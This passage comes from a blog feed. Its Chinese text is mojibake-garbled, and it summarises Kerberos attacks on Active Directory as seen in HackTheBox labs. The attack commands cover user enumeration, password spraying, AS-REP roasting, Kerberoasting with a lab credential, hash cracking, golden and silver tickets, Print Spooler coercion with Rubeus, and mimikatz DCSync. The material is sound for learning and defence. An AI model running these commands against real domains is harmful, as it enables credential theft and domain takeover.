”ç©¶å®ƒç»™çš„è½¯ä»¶ï¼Œæ¯”å¦‚è¿™é‡Œçš„SSSDã€ADFSã€‚è€Œä¸”ç¯å¢ƒä¸å¤ªç¨³å®šï¼ŒCVE-2022-47966æ‰“äº†å¥½ä¹…æ‰æˆåŠŸï¼Œä¸­é—´è¿˜é‡ç½®äº†ä¸¤æ¬¡é¶æœºï¼Œé‡æ¥äº†ä¸¤éã€‚è¿˜æœ‰è¿™æ¬¡é¶æœºéƒ½æ²¡å¼€SSHï¼Œåªèƒ½é€šè¿‡å…¶ä»–è½¯ä»¶è¿›è¡Œå†…ç½‘æ¸—é€ã€‚åˆç‹ ç‹ å¤ä¹ äº†ä¸€æ³¢å†…ç½‘ä»£ç†ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Pentest</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kerberos Summary</title>
    <link href="/2023/07/26/Kerberos-Summary/"/>
    <url>/2023/07/26/Kerberos-Summary/</url>
    
    <content type="html"><![CDATA[<p>æ‰“ Windows é¶æœºå¸¸é‡åˆ°Kerberosï¼Œåœ¨æ­¤æ€»ç»“ä¸€ä¸‹</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ZUhrRpYZYV.png" alt=""></p><h3 id="KerberosåŸç†"><a href="#KerberosåŸç†" class="headerlink" title="KerberosåŸç†"></a>KerberosåŸç†</h3><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_hR7kHInCAn.png" alt=""></p><h4 id="Kerberosè®¤è¯è¿‡ç¨‹"><a href="#Kerberosè®¤è¯è¿‡ç¨‹" class="headerlink" title="Kerberosè®¤è¯è¿‡ç¨‹"></a>Kerberosè®¤è¯è¿‡ç¨‹</h4><ol><li><strong>AS_REQ</strong>ï¼šClientå‘ASå‘èµ·AS_REQï¼Œè¯·æ±‚å‡­æ®æ˜¯Client HashåŠ å¯†çš„æ—¶é—´æˆ³</li><li><strong>AS_REP</strong>ï¼šASä½¿ç”¨Client Hashè¿›è¡Œè§£å¯†ï¼Œå¦‚æœç»“æœæ­£ç¡®å°±è¿”å›ç”¨krbtgtçš„NTLM HashåŠ å¯†çš„TGTç¥¨æ®ï¼ˆTGSä¸­åŒ…å«PACï¼ŒPACåŒ…å«Client SIDå’Œç»„ï¼‰</li><li><strong>TGS_REQ</strong>ï¼šClientå‡­å€ŸTGTç¥¨æ®å‘TGSå‘èµ·é’ˆå¯¹ç‰¹å®šæœåŠ¡çš„TGS_REQè¯·æ±‚</li><li><strong>TGS_REP</strong>ï¼šTGSä½¿ç”¨krbtgt hashè¿›è¡Œè§£å¯†ï¼Œæ­£ç¡®åˆ™è¿”å›ç”¨æœåŠ¡hashåŠ å¯†çš„TGSç¥¨æ®</li><li><strong>AP_REQ</strong>ï¼šClientæ‹¿ç€TGSç¥¨æ®å»è¯·æ±‚æœåŠ¡</li><li><strong>AP_REP</strong>ï¼šæœåŠ¡ä½¿ç”¨è‡ªå·±çš„Hashè§£å¯†TGSç¥¨æ®ã€‚æ­£ç¡®åˆ™æ‹¿ç€PACå»KDCè¯¢é—®Clientæœ‰æ— è®¿é—®æƒé™ï¼ŒåŸŸæ§è§£å¯†PACï¼Œåˆ¤æ–­Clientçš„è®¿é—®æƒé™åè¿”å›ç»“æœã€‚</li></ol><h2 id="AS-REQ-amp-AS-REP"><a href="#AS-REQ-amp-AS-REP" class="headerlink" title="AS_REQ &amp; AS_REP"></a>AS_REQ &amp; AS_REP</h2><h3 id="åŸŸå†…ç”¨æˆ·æšä¸¾"><a href="#åŸŸå†…ç”¨æˆ·æšä¸¾" class="headerlink" title="åŸŸå†…ç”¨æˆ·æšä¸¾"></a>åŸŸå†…ç”¨æˆ·æšä¸¾</h3><p>åŸç†ï¼šç”¨æˆ·ä¸å­˜åœ¨å’Œå¯†ç é”™è¯¯æ—¶ï¼ŒKerberosè¿”å›çš„error-codeä¸åŒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=<span class="hljs-string">&#x27;active.htb&#x27;</span>,userdb=<span class="hljs-string">&#x27;/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt&#x27;</span> 10.10.10.100<br></code></pre></td></tr></table></figure><h3 id="å¯†ç å–·æ´’æ”»å‡»"><a href="#å¯†ç å–·æ´’æ”»å‡»" class="headerlink" title="å¯†ç å–·æ´’æ”»å‡»"></a>å¯†ç å–·æ´’æ”»å‡»</h3><p><strong>æ”»å‡»åœºæ™¯ï¼š</strong> åœ¨å·²æœ‰ç”¨æˆ·åçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥å°è¯•å–·æ´’å¯†ç </p><p>æ™®é€šçš„çˆ†ç ´å°±æ˜¯ç”¨æˆ·åå›ºå®šï¼Œçˆ†ç ´å¯†ç ï¼›å¯†ç å–·æ´’æ˜¯ç”¨å›ºå®šçš„å¯†ç å»è·‘ç”¨æˆ·åã€‚</p><p><strong>å·¥å…·ï¼šDomainPasswordSpray</strong> <a href="https://github.com/dafthack/DomainPasswordSpray" title="https://github.com/dafthack/DomainPasswordSpray">https://github.com/dafthack/DomainPasswordSpray</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-DomainPasswordSpray</span> <span class="hljs-literal">-UserList</span> users.txt <span class="hljs-literal">-Domain</span> domain<span class="hljs-literal">-name</span> <span class="hljs-literal">-PasswordList</span> passlist.txt <span class="hljs-literal">-OutFile</span> sprayed<span class="hljs-literal">-creds</span>.txt<br></code></pre></td></tr></table></figure><h3 id="é»„é‡‘ç¥¨æ®"><a href="#é»„é‡‘ç¥¨æ®" class="headerlink" title="é»„é‡‘ç¥¨æ®"></a>é»„é‡‘ç¥¨æ®</h3><p>åœ¨Kerberosè®¤è¯ä¸­ï¼Œæ¯ä¸ªç”¨æˆ·çš„ç¥¨æ®éƒ½æ˜¯ç”±krbtgt NTLM-hashè¿›è¡ŒåŠ å¯†çš„ï¼Œå¦‚æœæˆ‘ä»¬æ‹¥æœ‰krbtgt NTLM-hashï¼Œå°±å¯ä»¥ä¼ªé€ ä»»æ„ç”¨æˆ·çš„TGTç¥¨æ®ï¼Œè¿™ä¸ªç¥¨æ®ä¹Ÿç§°ä¸ºé»„é‡‘ç¥¨æ®ã€‚ä¸€èˆ¬ç”¨æ¥åšæƒé™ç»´æŒã€‚</p><p><strong>åˆ©ç”¨æ¡ä»¶ï¼š</strong></p><ol><li>Domain SID</li><li>krbtgt hash</li></ol><h4 id="åˆ©ç”¨è¿‡ç¨‹"><a href="#åˆ©ç”¨è¿‡ç¨‹" class="headerlink" title="åˆ©ç”¨è¿‡ç¨‹"></a>åˆ©ç”¨è¿‡ç¨‹</h4><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡DCSyncæ‹¿åˆ°çš„krbtgtåšä¸€ä¸ªé»„é‡‘ç¥¨æ®</p><p>è·å–Domain SID</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_R83v5LB-KS.png" alt=""></p><p>åˆ©ç”¨ä¸Šé¢è·å–åˆ°çš„Domain SIDå’Œkrbtgtåˆ¶ä½œé»„é‡‘ç¥¨æ®</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ZS52zRh9IQ.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_gJoqbP2GKj.png" alt=""></p><h4 id="æ„å¤–æƒ…å†µ"><a href="#æ„å¤–æƒ…å†µ" class="headerlink" title="æ„å¤–æƒ…å†µ"></a>æ„å¤–æƒ…å†µ</h4><p><strong>æ—¶é’ŸåŒæ­¥</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ python psexec.py htb.local/auray@forest -k -no-pass<br>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporatio<br><br>[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)<br></code></pre></td></tr></table></figure><p>è¿™ç§æƒ…å†µéœ€è¦è·ŸåŸŸè¿›è¡Œæ—¶é’ŸåŒæ­¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo ntpdate 10.10.10.161<br></code></pre></td></tr></table></figure><p><strong>SMBè¿æ¥å¤±è´¥</strong></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_LcDgW17HNN.png" alt=""></p><p>è¿™ç§æƒ…å†µéœ€è¦ä¿®æ”¹hostï¼Œpsexecçš„å‘½ä»¤ä¹Ÿå¾—ä½¿ç”¨ä¸»æœºå</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">tail</span> -n 1 /etc/hosts<br>10.10.10.161 htb.local forest<br><br>python psexec.py htb.local/auray@forest -k -no-pass<br></code></pre></td></tr></table></figure><h3 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h3><p><strong>æ”»å‡»åœºæ™¯ï¼š</strong> å¦‚æœæ‹¿åˆ°äº†ç”¨æˆ·åï¼Œç›®æ ‡æœåŠ¡å™¨åˆæš´éœ²äº†kerberosç«¯å£ï¼Œå¯ä»¥å°è¯•AS-REP Roastingæ”»å‡»</p><p>å½“è¢«æ”»å‡»è´¦å·è®¾ç½® <strong>â€œä¸éœ€è¦Kerberosé¢„èº«ä»½éªŒè¯â€</strong> åï¼Œåœ¨AS_REPè¿‡ç¨‹ä¸­å°±å¯ä»¥ä»»æ„ä¼ªé€ ç”¨æˆ·åï¼ˆæ— éœ€Client Hashï¼‰è¯·æ±‚å‡­æ®ï¼ŒASä¼šå°†ä¼ªé€ è¯·æ±‚çš„ç”¨æˆ·åNTLM HashåŠ å¯†åè¿”å›ï¼Œå¯¹æ”¶åˆ°çš„AS_REPå†…å®¹ï¼ˆenc-partåº•ä¸‹çš„cipherï¼Œå› ä¸ºè¿™éƒ¨åˆ†æ—¶ä½¿ç”¨ç”¨æˆ·hashåŠ å¯†çš„session-keyï¼Œæˆ‘ä»¬é€šè¿‡ç¦»çº¿çˆ†ç ´å°±å¯ä»¥è·å¾—ç”¨æˆ·hashï¼‰é‡æ–°ç»„åˆï¼Œèƒ½å¤Ÿæ‹¼æ¥æˆ â€œKerberos 5 AS_REP etype 23â€ï¼ˆ18200ï¼‰çš„æ ¼å¼ï¼Œä½¿ç”¨hashcatå¯¹å…¶è¿›è¡Œçˆ†ç ´ï¼Œæœ€ç»ˆè·å–è¯¥ç”¨æˆ·çš„æ˜æ–‡å£ä»¤</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_sj04BCwUub.png" style="zoom:67%;" /></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">cat</span> user.txt);<span class="hljs-keyword">do</span> python3 examples/GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/<span class="hljs-variable">$&#123;user&#125;</span> | grep -v impacket;<span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°Hashä¹‹åå¯ä»¥é€šè¿‡hashcatçˆ†ç ´å¯†ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hashcat -m 18200 svc-alfredsco.kerb /usr/share/wordlists/rockyou.txt --force<br>john --wordlist=/usr/share/wordlists/rockyou.txt svc.txt<br></code></pre></td></tr></table></figure><h2 id="TGS-REQ-amp-TGS-REP"><a href="#TGS-REQ-amp-TGS-REP" class="headerlink" title="TGS_REQ &amp; TGS_REP"></a>TGS_REQ &amp; TGS_REP</h2><h3 id="pass-the-ticket"><a href="#pass-the-ticket" class="headerlink" title="pass the ticket"></a>pass the ticket</h3><p>Kerberosé™¤äº†ç¬¬ä¸€æ­¥AS_REPæ˜¯ä½¿ç”¨ç”¨æˆ·hashåŠ å¯†æ—¶é—´æˆ³ä¹‹å¤–ï¼Œå…¶ä»–çš„æ­¥éª¤çš„éªŒè¯éƒ½æ˜¯é€šè¿‡ç¥¨æ®ï¼Œè¿™ä¸ªç¥¨æ®å¯ä»¥æ˜¯TGTç¥¨æ®æˆ–TGSç¥¨æ®ã€‚å› ä¸ºç¥¨æ®é‡Œé¢çš„å†…å®¹ä¸»è¦æ˜¯session_keyå’Œticketï¼ˆä½¿ç”¨æœåŠ¡hashåŠ å¯†çš„ï¼ŒæœåŠ¡åŒ…æ‹¬krbtgtï¼‰ï¼Œæ‹¿åˆ°ç¥¨æ®ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥ç”¨è¿™ä¸ªç¥¨æ®æ¥ä½œä¸ºä¸‹é˜¶æ®µçš„éªŒè¯äº†</p><h3 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h3><p><strong>åŸç†ï¼š</strong> åœ¨TGS_REPä¸­ï¼Œç”¨æˆ·å°†æ”¶åˆ°ç”±ç›®æ ‡æœåŠ¡å®ä¾‹çš„NTLM HashåŠ å¯†çš„TGSç¥¨æ®ï¼ŒåŠ å¯†ç®—æ³•ä¸ºRC4-HMAC</p><p><strong>åˆ©ç”¨åœºæ™¯ï¼š</strong> å½“æˆ‘ä»¬æ‹¥æœ‰ä¸€ä¸ªç”¨æˆ·å‡­æ®æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥è¯·æ±‚TGSç¥¨æ®ï¼Œå†è¿›è¡Œçˆ†ç ´</p><p>å¯¹äºåŸŸå†…çš„ä»»ä½•ä¸»æœºï¼Œéƒ½å¯ä»¥é€šè¿‡æŸ¥è¯¢SPNï¼Œå‘åŸŸå†…çš„æ‰€æœ‰æœåŠ¡è¯·æ±‚TGSï¼ˆå› ä¸ºKDCä¸ä¼šéªŒè¯æƒé™ï¼šç”¨æˆ·å‘KDCå‘èµ·TGS_REQè¯·æ±‚ï¼Œä¸ç®¡ç”¨æˆ·å¯¹æœåŠ¡æœ‰æ²¡æœ‰è®¿é—®æƒé™ï¼Œåªè¦TGTæ­£ç¡®ï¼Œé‚£ä¹ˆè‚¯å®šä¼šè¿”å›TGSï¼‰ç„¶åè¿›è¡Œæš´åŠ›ç ´è§£ï¼Œè·å–æœåŠ¡çš„NTLM Hashã€‚ä½†åªæœ‰åŸŸç”¨æˆ·çš„SPNæ˜¯å¯ä»¥åˆ©ç”¨çš„ï¼ˆå› ä¸ºæœºå™¨è´¦æˆ·çš„SPNæ¯30å¤©ä¼šæ›´æ”¹éšæœº128å„å­—ç¬¦å¯†ç å¯¼è‡´æ— æ³•ç ´è§£ï¼‰ï¼Œæ‰€ä»¥åœ¨å®é™…è¿‡ç¨‹ä¸­è¦æ³¨æ„æ”»å‡»çš„æ˜¯åŸŸç”¨æˆ·ã€‚</p><p><strong>åˆ©ç”¨impacketä¸­çš„GetUserSPNs.pyè¿›è¡Œæ”»å‡»</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_7Nigw5qriD.png" alt=""></p><p>ä½¿ç”¨johnè¿›è¡Œçˆ†ç ´</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">john test.hash --wordlist=/usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_W3eE0H-c91.png" alt=""></p><h3 id="ç™½é“¶ç¥¨æ®"><a href="#ç™½é“¶ç¥¨æ®" class="headerlink" title="ç™½é“¶ç¥¨æ®"></a>ç™½é“¶ç¥¨æ®</h3><p>åœ¨TGS_REPä¸­çš„ticketçš„encpartæ˜¯ä½¿ç”¨æœåŠ¡çš„hashè¿›è¡ŒåŠ å¯†çš„ï¼Œå¦‚æœæˆ‘ä»¬æ‹¥æœ‰æœåŠ¡çš„hashï¼Œå°±å¯ä»¥ç»™æˆ‘ä»¬è‡ªå·±ç­¾å‘ä»»æ„ç”¨æˆ·çš„TGSç¥¨æ®ï¼Œè¿™ä¸ªç¥¨æ®ä¹Ÿè¢«ç§°ä¸ºç™½é“¶ç¥¨æ®ã€‚</p><p><strong>ç›¸è¾ƒäºé»„é‡‘ç¥¨æ®</strong>ï¼Œç™½é“¶ç¥¨æ®ä½¿ç”¨è¦è®¿é—®æœåŠ¡çš„hashï¼Œè€Œä¸æ˜¯krbtgtçš„hashï¼Œç”±äºç”Ÿæˆçš„æ˜¯TGSç¥¨æ®ï¼Œä¸éœ€è¦è·ŸåŸŸæ§æ‰“äº¤é“ï¼Œä½†æ˜¯ç™½é“¶ç¥¨æ®åªèƒ½è®¿é—®ç‰¹å®šæœåŠ¡</p><p><strong>æ³¨æ„ï¼š</strong> ä¼ªé€ çš„ç™½é“¶ç¥¨æ®æ²¡æœ‰æºå¸¦æœ‰æ•ˆKDCç­¾åçš„PACã€‚å¦‚æœå°†ç›®æ ‡ä¸»æœºé…ç½®ä¸ºéªŒè¯KDC PACç­¾åï¼Œåˆ™ç™½é“¶ç¥¨æ®å°†ä¸èµ·ä½œç”¨ã€‚</p><h2 id="å§”æ´¾æ”»å‡»"><a href="#å§”æ´¾æ”»å‡»" class="headerlink" title="å§”æ´¾æ”»å‡»"></a>å§”æ´¾æ”»å‡»</h2><p>å§”æ´¾æ˜¯å°†åŸŸç”¨æˆ·çš„æƒé™å§”æ´¾ç»™æœåŠ¡è´¦æˆ·ï¼Œå§”æ´¾ä¹‹åï¼ŒæœåŠ¡è´¦æˆ·å°±è·å¾—äº†åŸŸç”¨æˆ·çš„èº«ä»½å»è¡ŒåŠ¨</p><p>æ³¨æ„ï¼šèƒ½å¤Ÿè¢«å§”æ´¾çš„ç”¨æˆ·åªèƒ½æ˜¯æœåŠ¡è´¦æˆ·æˆ–æœºå™¨è´¦æˆ·</p><h4 id="ä¸‰ç§å§”æ´¾"><a href="#ä¸‰ç§å§”æ´¾" class="headerlink" title="ä¸‰ç§å§”æ´¾"></a>ä¸‰ç§å§”æ´¾</h4><ul><li>éçº¦æŸå§”æ´¾æ˜¯æŒ‡ç”¨æˆ·è´¦æˆ·å°†è‡ªèº«çš„TGTè½¬å‘ç»™æœåŠ¡è´¦æˆ·ä½¿ç”¨</li><li>çº¦æŸå§”æ´¾é€šè¿‡S4U2Selfå’ŒS4U2Proxyä¸¤ä¸ªæ‰©å±•åè®®é™åˆ¶æœåŠ¡è´¦æˆ·åªèƒ½è®¿é—®ç‰¹å®šæœåŠ¡èµ„æº</li><li>åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾æ˜¯å°†å§”æ´¾çš„ç®¡ç†ç§»äº¤ç»™æœåŠ¡èµ„æºè¿›è¡Œæ§åˆ¶ï¼Œå…¶ä½™å’Œçº¦æŸå§”æ´¾åŸºæœ¬ç›¸åŒ</li></ul><h3 id="éçº¦æŸæ€§å§”æ´¾"><a href="#éçº¦æŸæ€§å§”æ´¾" class="headerlink" title="éçº¦æŸæ€§å§”æ´¾"></a>éçº¦æŸæ€§å§”æ´¾</h3><p>å½“service1çš„æœåŠ¡è´¦æˆ·å¼€å¯äº†éçº¦æŸå§”æ´¾åï¼Œuserè®¿é—®service1æ—¶ï¼Œservice1ä¼šå°†userçš„TGTä¿å­˜åœ¨ISASSå†…å­˜ä¸­ï¼Œç„¶åservice1å°±å¯ä»¥åˆ©ç”¨TGTä»¥userçš„èº«ä»½è®¿é—®åŸŸä¸­çš„ä»»ä½•userå¯ä»¥è®¿é—®çš„æœåŠ¡</p><p>éçº¦æŸå§”æ´¾çš„è®¾ç½®éœ€è¦SeEnableDelegationæƒé™ï¼Œä¸€èˆ¬æ˜¯ç®¡ç†å‘˜å…·æœ‰æ­¤æƒé™</p><h4 id="éçº¦æŸå§”æ´¾æµç¨‹"><a href="#éçº¦æŸå§”æ´¾æµç¨‹" class="headerlink" title="éçº¦æŸå§”æ´¾æµç¨‹"></a><strong>éçº¦æŸå§”æ´¾æµç¨‹</strong></h4><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_dY170jQ6L-.png" alt=""></p><ol><li>åŸŸå†…ç”¨æˆ·Aé€šè¿‡Kerberosè®¤è¯åè®¿é—®WebæœåŠ¡å™¨</li><li>WebæœåŠ¡å™¨ä»¥æœåŠ¡è´¦æˆ·Bå‘KDCè¯·æ±‚ç”¨æˆ·Açš„å¯è½¬å‘ç¥¨æ®TGT</li><li>KDCæ£€æŸ¥Bçš„å§”æ´¾å±æ€§ï¼Œä¸‹å‘TGT</li><li>æœåŠ¡è´¦æˆ·Bä½¿ç”¨TGTå‘KDCç”³è¯·æœåŠ¡ç¥¨æ®TGS</li><li>KDCæ£€æŸ¥å§”æ´¾å±æ€§å’Œç”³è¯·çš„æœåŠ¡ï¼Œä¸‹å‘TGS</li><li>æœåŠ¡è´¦æˆ·ä½¿ç”¨TGSè®¿é—®å…¶ä»–æœåŠ¡</li></ol><h4 id="ä¾¦æŸ¥æ€è·¯ï¼šæ‰¾åˆ°éçº¦æŸå§”æ´¾è´¦æˆ·"><a href="#ä¾¦æŸ¥æ€è·¯ï¼šæ‰¾åˆ°éçº¦æŸå§”æ´¾è´¦æˆ·" class="headerlink" title="ä¾¦æŸ¥æ€è·¯ï¼šæ‰¾åˆ°éçº¦æŸå§”æ´¾è´¦æˆ·"></a>ä¾¦æŸ¥æ€è·¯ï¼šæ‰¾åˆ°éçº¦æŸå§”æ´¾è´¦æˆ·</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ADFindæŸ¥è¯¢éçº¦æŸå§”æ´¾æ™®é€šè´¦æˆ·</span><br>AdFind.exe -b <span class="hljs-string">&quot;DC=redteam,DC=lab&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> dn<br><span class="hljs-comment"># ADFindæŸ¥è¯¢éçº¦æŸæœºå™¨è´¦æˆ·</span><br>AdFind.exe -b <span class="hljs-string">&quot;DC=redteam,DC=lab&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> dn<br><span class="hljs-comment"># PowerViewæŸ¥è¯¢éçº¦æŸå§”æ´¾çš„æœºå™¨è´¦æˆ·</span><br>powershell-import PowerView.ps1<br>powershell Get-NetComputer â€“unconstrained | select dnshostname, samaccountname<br></code></pre></td></tr></table></figure><h4 id="åˆ©ç”¨æ‰“å°æœºæ¼æ´"><a href="#åˆ©ç”¨æ‰“å°æœºæ¼æ´" class="headerlink" title="åˆ©ç”¨æ‰“å°æœºæ¼æ´"></a>åˆ©ç”¨æ‰“å°æœºæ¼æ´</h4><p>å¼ºè¿«è¿è¡Œæ‰“å°æœåŠ¡ï¼ˆPrint Spoolerï¼‰çš„ä¸»æœºå‘ç›®æ ‡ä¸»æœºå‘èµ·Kerberosæˆ–NTLMè®¤çœŸè¯·æ±‚</p><p><strong>å‰ææ¡ä»¶ï¼š</strong></p><ol><li>Administratoræƒé™</li><li>åŸŸç”¨æˆ·çš„è´¦å·å¯†ç </li><li>åŸŸæ§å¼€å¯æ‰“å°æœº</li></ol><p><strong>å·¥å…·ï¼š</strong><a href="https://github.com/leechristensen/SpoolSample/" title="https://github.com/leechristensen/SpoolSample/">https://github.com/leechristensen/SpoolSample/</a></p><p><strong>åˆ©ç”¨è¿‡ç¨‹ï¼š</strong></p><ol><li>æŸ¥è¯¢æ‰“å°æœåŠ¡æ˜¯å¦å¼€å¯ï¼ˆåŸŸæ§ä¸ŠæŸ¥è¯¢ï¼‰<br><code>sc query spooler</code></li><li>ä½¿ç”¨Rubeusç›‘å¬æ¥è‡ªåŸŸæ§çš„ç¥¨æ®<br><code>Rubeus.exe monitor /interval:2 /filteruser:DC2016$</code></li><li>ä½¿ç”¨SpoolSampleæ‰§è¡Œæ‰“å°æœºæ¼æ´åˆ©ç”¨ï¼Œè¿›è¡Œå¼ºåˆ¶éªŒè¯<br><code>SpoolSample.exe DC2016 WIN10-1</code></li><li>Rubeusç›‘å¬åˆ°ç¥¨æ®å¹¶å¯¼å…¥è¯¥ç¥¨æ®<br><code>Rubeus.exe /ptt /ticket:dt...</code></li><li>ä½¿ç”¨mimikatzå¯¼å‡ºHash<br><code>mimikatz.exe &quot;lsadump::dcsync /domain:aut.htb /user:aut\Administrator&quot; &quot;exit&quot;</code></li></ol><h3 id="çº¦æŸæ€§å§”æ´¾"><a href="#çº¦æŸæ€§å§”æ´¾" class="headerlink" title="çº¦æŸæ€§å§”æ´¾"></a>çº¦æŸæ€§å§”æ´¾</h3><p>åœ¨çº¦æŸå§”æ´¾çš„Kerberosä¸­ï¼ŒåŒæ ·ä¼šå°†TGTå‘é€ç»™ç›¸å…³å—å§”æ´¾çš„æœåŠ¡ï¼Œä½†ç”±äºS4U2proxyçš„å½±å“ï¼Œè¯¥ç¥¨æ®åªèƒ½è®¿é—®æŒ‡å®šçš„æœåŠ¡</p><h4 id="S4U2self"><a href="#S4U2self" class="headerlink" title="S4U2self"></a>S4U2self</h4><p>å…è®¸å—çº¦æŸå§”æ´¾çš„æœåŠ¡ <strong>ï¼ˆä¸»åŠ¨ï¼‰ä»£è¡¨ä»»æ„ç”¨æˆ·å‘KDCè¯·æ±‚æœåŠ¡è‡ªèº«</strong>ï¼Œä»è€Œè·å–ä¸€å¼ è¯¥ç”¨æˆ·ï¼ˆä»»æ„ç”¨æˆ·ï¼‰çš„å½“å‰å—çº¦æŸå§”æ´¾æœåŠ¡çš„ç¥¨æ®TGSï¼ˆSTï¼‰ï¼Œè¯¥æœåŠ¡ç¥¨æ®åŒ…å«ç”¨æˆ·çš„ç›¸å…³ä¿¡æ¯ï¼Œæ¯”å¦‚è¯¥ç”¨æˆ·çš„ç»„ä¿¡æ¯ç­‰</p><h4 id="S4U2proxy"><a href="#S4U2proxy" class="headerlink" title="S4U2proxy"></a>S4U2proxy</h4><p>å…è®¸å—çº¦æŸå§”æ´¾çš„æœåŠ¡é€šè¿‡æœåŠ¡ç¥¨æ®STï¼Œä»£è¡¨ç”¨æˆ·å»è¯·æ±‚æŒ‡å®šçš„æœåŠ¡</p><p>é…ç½®äº†çº¦æŸå§”æ´¾çš„è´¦æˆ·å±æ€§ä¼šæœ‰ä¸¤ä¸ªå˜åŒ–ï¼š</p><ol><li>è´¦æˆ·çš„<code>userAccountControl</code>å±æ€§ä¼šè¢«è®¾ç½®ä¸º<code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>ï¼Œå€¼ä¸º<code>16781312</code></li><li>è´¦æˆ·çš„<code>msDS-AllowedToDelegateTo</code>å±æ€§ï¼Œæ·»åŠ å…è®¸å§”æ´¾çš„æœåŠ¡</li></ol><h4 id="ä¾¦æŸ¥æ€è·¯ï¼šæ‰¾åˆ°çº¦æŸå§”æ´¾è´¦æˆ·"><a href="#ä¾¦æŸ¥æ€è·¯ï¼šæ‰¾åˆ°çº¦æŸå§”æ´¾è´¦æˆ·" class="headerlink" title="ä¾¦æŸ¥æ€è·¯ï¼šæ‰¾åˆ°çº¦æŸå§”æ´¾è´¦æˆ·"></a>ä¾¦æŸ¥æ€è·¯ï¼šæ‰¾åˆ°çº¦æŸå§”æ´¾è´¦æˆ·</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># AdFind.exeæŸ¥è¯¢çº¦æŸå§”æ´¾æœºå™¨è´¦æˆ·</span><br>AdFind.exe -b <span class="hljs-string">&quot;DC=redteam,DC=lab&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot;</span> msds-allowedtodelegateto<br><span class="hljs-comment"># AdFind.exeæŸ¥è¯¢çº¦æŸå§”æ´¾æœåŠ¡è´¦æˆ·</span><br>AdFind.exe -b <span class="hljs-string">&quot;DC=redteam,DC=lab&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;</span> cn distinguishedName msds-allowedtodelegateto<br><br><span class="hljs-comment"># å¯¼å…¥</span><br>powershell-import PowerView.ps1<br><span class="hljs-comment"># PowerViewæŸ¥è¯¢çº¦æŸå§”æ´¾æœºå™¨è´¦æˆ·</span><br>powershell Get-DomainComputer 